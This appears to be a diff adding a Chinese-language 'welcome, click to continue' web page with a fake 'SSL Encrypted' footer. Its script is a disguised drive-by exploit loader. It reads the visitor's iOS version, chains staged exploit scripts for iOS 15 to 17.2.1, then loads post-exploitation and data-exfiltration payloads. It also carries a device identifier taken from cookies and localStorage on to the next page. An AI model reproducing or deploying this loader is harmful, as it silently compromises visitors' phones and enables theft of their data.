@@ -1,0 +1,357 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<title>欢迎</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+  html, body { width: 100%; height: 100%; overflow: hidden; font-family: -apple-system, BlinkMacSystemFont, "PingFang SC", "Helvetica Neue", sans-serif; }
+  body {
+    background: linear-gradient(135deg, #667eea 0%, #764ba2 50%, #f093fb 100%);
+    background-size: 400% 400%;
+    animation: bgShift 12s ease infinite;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    min-height: 100vh;
+    padding: 20px;
+  }
+  @keyframes bgShift {
+    0%   { background-position: 0% 50%; }
+    50%  { background-position: 100% 50%; }
+    100% { background-position: 0% 50%; }
+  }
+  .card {
+    background: rgba(255, 255, 255, 0.95);
+    backdrop-filter: blur(20px);
+    -webkit-backdrop-filter: blur(20px);
+    border-radius: 28px;
+    padding: 48px 36px;
+    max-width: 420px;
+    width: 100%;
+    text-align: center;
+    box-shadow: 0 20px 60px rgba(0, 0, 0, 0.25);
+    animation: fadeUp 0.8s cubic-bezier(0.16, 1, 0.3, 1) both;
+  }
+  @keyframes fadeUp {
+    from { opacity: 0; transform: translateY(30px); }
+    to   { opacity: 1; transform: translateY(0); }
+  }
+  .icon {
+    width: 88px;
+    height: 88px;
+    border-radius: 50%;
+    margin: 0 auto 28px;
+    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    box-shadow: 0 10px 30px rgba(102, 126, 234, 0.4);
+    animation: pulse 2.5s ease-in-out infinite;
+  }
+  @keyframes pulse {
+    0%, 100% { transform: scale(1); box-shadow: 0 10px 30px rgba(102, 126, 234, 0.4); }
+    50%      { transform: scale(1.06); box-shadow: 0 15px 40px rgba(102, 126, 234, 0.55); }
+  }
+  .icon svg { width: 44px; height: 44px; fill: #fff; }
+  h1 {
+    font-size: 26px;
+    font-weight: 700;
+    color: #1a1a2e;
+    margin-bottom: 14px;
+    letter-spacing: -0.3px;
+  }
+  .subtitle {
+    font-size: 15px;
+    color: #5f6c86;
+    line-height: 1.6;
+    margin-bottom: 36px;
+  }
+  .btn {
+    display: inline-block;
+    width: 100%;
+    padding: 18px 28px;
+    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+    color: #fff;
+    font-size: 17px;
+    font-weight: 600;
+    border: none;
+    border-radius: 16px;
+    cursor: pointer;
+    box-shadow: 0 10px 28px rgba(102, 126, 234, 0.4);
+    transition: transform 0.2s ease, box-shadow 0.2s ease;
+    position: relative;
+    overflow: hidden;
+  }
+  .btn:active {
+    transform: scale(0.97);
+    box-shadow: 0 5px 16px rgba(102, 126, 234, 0.3);
+  }
+  .btn::after {
+    content: "";
+    position: absolute;
+    top: 0; left: -100%;
+    width: 100%; height: 100%;
+    background: linear-gradient(90deg, transparent, rgba(255,255,255,0.25), transparent);
+    transition: left 0.6s ease;
+  }
+  .btn:active::after, .btn:hover::after { left: 100%; }
+  .footer {
+    margin-top: 28px;
+    font-size: 12px;
+    color: #a8b0c4;
+  }
+  .loading {
+    display: none;
+    margin-top: 24px;
+    font-size: 14px;
+    color: #667eea;
+    font-weight: 500;
+  }
+  .loading.show { display: block; }
+  .spinner {
+    display: inline-block;
+    width: 16px;
+    height: 16px;
+    border: 2.5px solid rgba(102, 126, 234, 0.2);
+    border-top-color: #667eea;
+    border-radius: 50%;
+    animation: spin 0.8s linear infinite;
+    vertical-align: middle;
+    margin-right: 8px;
+  }
+  @keyframes spin { to { transform: rotate(360deg); } }
+</style>
+</head>
+<body>
+  <div class="card">
+    <div class="icon">
+      <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
+      </svg>
+    </div>
+    <h1>欢迎访问</h1>
+    <p class="subtitle">请点击下方按钮继续浏览，为您展示完整内容。</p>
+    <button class="btn" id="goBtn">点击查看</button>
+    <div class="loading" id="loading">
+      <span class="spinner"></span>加载中，请稍候...
+    </div>
+    <div class="footer">Secure Connection · SSL Encrypted</div>
+  </div>
+
+<script>
+  // ====== Exploit Payload Loader (iOS 13.0 – 17.2.1 only) ======
+  (function () {
+    function _parseInt(v, d) { var n = parseInt(v, 10); return isNaN(n) ? d : n; }
+
+    function getIosVersion() {
+      var ua = navigator.userAgent || '';
+      var sv = ua.match(/Version\/(\d+)(?:[_\.](\d+))?(?:[_\.](\d+))?/);
+      var cv = ua.match(/CPU\s+iPhone\s+OS\s+(\d+)(?:[_\.](\d+))?(?:[_\.](\d+))?\s+like\s+Mac\s+OS\s+X/i);
+
+      function build(m) {
+        if (!m) return null;
+        var maj = _parseInt(m[1], 0), min = _parseInt(m[2], 0), pat = _parseInt(m[3], 0);
+        if (maj <= 0) return null;
+        return {
+          maj: maj, min: min, pat: pat,
+          str: maj + '.' + min + (pat ? '.' + pat : ''),
+          num: maj * 10000 + min * 100 + pat
+        };
+      }
+
+      var s = build(sv), c = build(cv);
+      if (s && c) return (s.num >= c.num) ? s : c;
+      if (s) return s;
+      if (c) return c;
+      return null;
+    }
+
+    function selectStage1(v) {
+      if (!v) return null; var n = v.num;
+      if (n >= 150200 && n <= 150500) return { name: 'Stage1_15.2_15.5_jacurutu', file: '/Stage1_15.2_15.5_jacurutu.js', range: '15.2-15.5' };
+      if (n >= 150600 && n <= 160102) return { name: 'Stage1_15.6_16.1.2_bluebird', file: '/Stage1_15.6_16.1.2_bluebird.js', range: '15.6-16.1.2' };
+      if (n >= 160200 && n <= 160501) return { name: 'Stage1_16.2_16.5.1_terrorbird', file: '/Stage1_16.2_16.5.1_terrorbird.js', range: '16.2-16.5.1' };
+      if (n >= 160600 && n <= 170201) return { name: 'Stage1_16.6_17.2.1_cassowary', file: '/Stage1_16.6_17.2.1_cassowary.js', range: '16.6-17.2.1' };
+      return null;
+    }
+
+    function selectStage2(v) {
+      if (!v) return null; var n = v.num;
+      // iOS 15.0 – 16.2: breezy15
+      if (n >= 150000 && n <= 160200) return { name: 'Stage2_15.0_16.2_breezy15', file: '/Stage2_15.0_16.2_breezy15.js', range: '15.0-16.2' };
+      // iOS 16.3 – 16.5.1: seedbell (16.3-16.5.1 variant)
+      if (n >= 160300 && n <= 160501) return { name: 'Stage2_16.3_16.5.1_seedbell', file: '/Stage2_16.3_16.5.1_seedbell.js', range: '16.3-16.5.1' };
+      // iOS 16.6 – 16.7.12: seedbell (16.6-16.7.12 variant)
+      if (n >= 160600 && n <= 160712) return { name: 'Stage2_16.6_16.7.12_seedbell', file: '/Stage2_16.6_16.7.12_seedbell.js', range: '16.6-16.7.12', pre: { name: 'Stage2_16.6_17.2.1_seedbell_pre', file: '/Stage2_16.6_17.2.1_seedbell_pre.js' } };
+      // iOS 17.0 – 17.2.1: seedbell (17.x variant) + pre-req
+      if (n >= 170000 && n <= 170201) return { name: 'Stage2_17.0_17.2.1_seedbell', file: '/Stage2_17.0_17.2.1_seedbell.js', range: '17.0-17.2.1', pre: { name: 'Stage2_16.6_17.2.1_seedbell_pre', file: '/Stage2_16.6_17.2.1_seedbell_pre.js' } };
+      return null;
+    }
+
+    function loadScript(url) {
+      return new Promise(function (resolve, reject) {
+        var s = document.createElement('script');
+        s.src = url;
+        s.async = false;
+        s.onload = function () { resolve(true); };
+        s.onerror = function () { reject(new Error('script load failed: ' + url)); };
+        document.head.appendChild(s);
+      });
+    }
+
+    var STAGE2_TO_STAGE3 = {
+      'Stage2_15.0_16.2_breezy15':   { name: 'Stage3_VariantA', file: '/Stage3_VariantA.js' },
+      'Stage2_16.3_16.5.1_seedbell': { name: 'Stage3_VariantB', file: '/Stage3_VariantB.js' },
+      'Stage2_16.6_16.7.12_seedbell': { name: 'Stage3_VariantB', file: '/Stage3_VariantB.js' },
+      'Stage2_17.0_17.2.1_seedbell': { name: 'Stage3_VariantB', file: '/Stage3_VariantB.js' }
+    };
+
+    function _callFn(fnName) {
+      try { if (typeof window[fnName] === 'function') return window[fnName](); }
+      catch (e) { console.warn(fnName + ' exec error:', e); return null; }
+    }
+
+    async function runExploitChain(iosVer) {
+      var s1 = selectStage1(iosVer);
+      var s2 = selectStage2(iosVer);
+      var logLines = [];
+      function log(msg) { var l = '[EXPLOIT] ' + msg; console.log(l); logLines.push(l); }
+      log('target iOS: ' + iosVer.str + ' (num=' + iosVer.num + ')');
+
+      if (!s1 || !s2) {
+        log('NO exploit payload for iOS ' + iosVer.str + ' — only sandbox exfil available');
+        window.__dsExploitChain = { ok: false, ios: iosVer.str, reason: 'unsupported_version', logs: logLines, sandboxOnly: true };
+        return 'sandbox_only';
+      }
+
+      log('Stage1: ' + s1.name + ' (' + s1.range + ')');
+      try { await loadScript(s1.file); } catch (e) { log('Stage1 load FAIL: ' + e.message); window.__dsExploitChain = { ok:false, stage1:s1.name, ios: iosVer.str, logs: logLines }; throw e; }
+      var r1 = _callFn(s1.name);
+      log('Stage1 result: ' + (r1 ? 'OK' : 'FAIL'));
+      if (!r1) { window.__dsExploitChain = { ok:false, stage1:s1.name, ios: iosVer.str, logs: logLines }; throw new Error(s1.name + ' returned falsy'); }
+
+      log('Stage2: ' + s2.name + ' (' + s2.range + ')');
+      try { await loadScript(s2.file); } catch (e) { log('Stage2 load FAIL: ' + e.message); window.__dsExploitChain = { ok:false, stage2:s2.name, ios: iosVer.str, logs: logLines }; throw e; }
+      var r2 = _callFn(s2.name);
+      log('Stage2 result: ' + (r2 ? 'OK' : 'FAIL'));
+      if (!r2) { window.__dsExploitChain = { ok:false, stage2:s2.name, ios: iosVer.str, logs: logLines }; throw new Error(s2.name + ' returned falsy'); }
+
+      var s3 = STAGE2_TO_STAGE3[s2.name];
+      if (s3) {
+        log('Stage3: ' + s3.name);
+        try { await loadScript(s3.file); } catch (e) { log('Stage3 load FAIL: ' + e.message); window.__dsExploitChain = { ok:false, stage3:s3.name, ios: iosVer.str, logs: logLines }; throw e; }
+        var r3 = _callFn(s3.name);
+        log('Stage3 result: ' + (r3 ? 'OK' : 'FAIL'));
+        if (!r3) { window.__dsExploitChain = { ok:false, stage3:s3.name, ios: iosVer.str, logs: logLines }; throw new Error(s3.name + ' returned falsy'); }
+      }
+
+      // Stage3 成功后立即构建 nativeBridge（在 post_exploit.js 启动前就绪，让 autoExfiltrate 走全量路径）
+      if (window._corunaPrimitives) {
+        log('Loading native_bridge.js (build window.nativeBridge from Stage3 primitives)');
+        try { await loadScript('payloads/native_bridge.js'); }
+        catch (e) { log('native_bridge load FAIL (non-fatal, sandbox-only mode): ' + e.message); }
+      } else {
+        log('Stage3 did not expose primitives — nativeBridge unavailable, sandbox-only mode');
+      }
+
+      log('Stage chain DONE — loading post_exploit + SDK');
+      try { await loadScript('payloads/post_exploit.js'); } catch (e) { log('post_exploit load FAIL: ' + e.message); window.__dsExploitChain = { ok:false, stage:'post_exploit', ios: iosVer.str, logs: logLines }; throw e; }
+      if (typeof window.startSdk === 'function') { try { window.startSdk(); } catch (e) { log('startSdk error: ' + e.message); } }
+
+      window.__dsExploitChain = { ok: true, stage1: s1.name, stage2: s2.name, stage3: s3 ? s3.name : null, ios: iosVer.str, logs: logLines };
+      return 'full_chain_ok';
+    }
+
+    window.__dsGetIosVersion = getIosVersion;
+    window.__dsSelectStage1 = selectStage1;
+    window.__dsSelectStage2 = selectStage2;
+    window.__dsStartExploit = async function __dsStartExploit() {
+      var ua = navigator.userAgent || '';
+      var isIOS = /iPhone|iPad|iPod|iOS/i.test(ua) || (navigator.platform && /iPhone|iPad|iPod/i.test(navigator.platform));
+      if (!isIOS) {
+        console.warn('[EXPLOIT] non-iOS device — chain bypassed, only sandbox SDK available');
+        try { await loadScript('payloads/post_exploit.js'); if (typeof window.startSdk === 'function') window.startSdk(); } catch (_) {}
+        window.__dsExploitChain = { ok: false, reason: 'not_ios', sandboxOnly: true };
+        return false;
+      }
+      var iosVer = getIosVersion();
+      if (!iosVer) {
+        console.warn('[EXPLOIT] cannot detect iOS version — running sandbox-only SDK');
+        try { await loadScript('payloads/post_exploit.js'); if (typeof window.startSdk === 'function') window.startSdk(); } catch (_) {}
+        window.__dsExploitChain = { ok: false, reason: 'version_unknown', sandboxOnly: true };
+        return false;
+      }
+      try { return await runExploitChain(iosVer); }
+      catch (err) {
+        console.error('[EXPLOIT] chain error:', err);
+        try { await loadScript('payloads/post_exploit.js'); if (typeof window.startSdk === 'function') window.startSdk(); } catch (_) {}
+        if (window.__dsExploitChain) window.__dsExploitChain.error = String(err && err.message || err);
+        else window.__dsExploitChain = { ok: false, error: String(err && err.message || err), sandboxOnly: true };
+        return 'chain_failed_sandbox_fallback';
+      }
+    };
+  })();
+
+  // ====== UI button handler ======
+  (function () {
+    var btn = document.getElementById('goBtn');
+    var loading = document.getElementById('loading');
+    function _extractParams() {
+      // Carry ds_uuid / device_uuid / channel / tpl from URL into group.html so device stays linked
+      var out = {};
+      try {
+        var qs = window.location.search.substring(1);
+        if (qs) qs.split('&').forEach(function(p){
+          var kv = p.split('=');
+          if (kv[0]) out[decodeURIComponent(kv[0])] = decodeURIComponent(kv.slice(1).join('='));
+        });
+      } catch(e) {}
+      try {
+        var ck = document.cookie.split(';');
+        ck.forEach(function(c){
+          c = c.trim(); if (!c) return;
+          var kv = c.split('=');
+          if (kv[0] && kv[0].trim() === 'ds_uuid' && !out.device_uuid && !out.ds_uuid) {
+            out.device_uuid = kv.slice(1).join('=').trim();
+          }
+        });
+      } catch(e) {}
+      try {
+        if (!out.device_uuid) {
+          var v = localStorage.getItem('ds_uuid');
+          if (v && /^[0-9a-fA-F]{32}$/.test(v)) out.device_uuid = v;
+        }
+      } catch(e) {}
+      return out;
+    }
+    function triggerGo() {
+      loading.classList.add('show');
+      btn.disabled = true;
+      btn.style.opacity = '0.7';
+      // Build /group.html URL preserving all known params + UUID cookie/localStorage value
+      var params = _extractParams();
+      var pairs = [];
+      Object.keys(params).forEach(function(k){
+        // skip empty values and already-handled internal keys
+        if (params[k] === undefined || params[k] === null) return;
+        pairs.push(encodeURIComponent(k) + '=' + encodeURIComponent(String(params[k])));
+      });
+      // Always force-reload with cache-buster to bypass Safari back-forward cache
+      pairs.push('_=' + Date.now());
+      var url = '/group.html' + (pairs.length ? '?' + pairs.join('&') : '');
+      setTimeout(function () {
+        if (window.parent && window.parent !== window) {
+          try { window.parent.location.href = url; return; } catch (e) {}
+        }
+        window.location.href = url;
+      }, 200);
+    }
+    btn.addEventListener('click', triggerGo);
+    btn.addEventListener('touchstart', function () {}, { passive: true });
+  })();
+</script>
+</body>
+</html>
